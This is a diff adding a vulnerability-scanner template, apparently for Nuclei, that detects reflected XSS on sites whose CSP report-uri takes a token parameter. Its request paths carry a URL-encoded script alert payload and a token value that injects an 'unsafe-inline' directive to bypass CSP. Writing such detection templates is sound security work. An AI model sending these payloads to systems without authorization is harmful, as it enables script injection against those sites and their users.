@@ -1,0 +1,31 @@
+id: csp-bypass-xss
+
+info:
+  name: Reflected XSS protected by CSP, with CSP bypass
+  author: Umair Hussain,reewardius
+  description: Detecting the presence of XSS vulnerability on websites that uses CSP report-uri with a token parameter
+  severity: medium
+  tags: xss,generic
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27"
+      - "{{BaseURL}}/?%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27"
+      
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "?token="
+          
+      - type: word
+        part: body
+        words:
+          - <script>alert(1)</script>
+          
+      - type: word
+        part: header
+        words:
+          - "text/html"
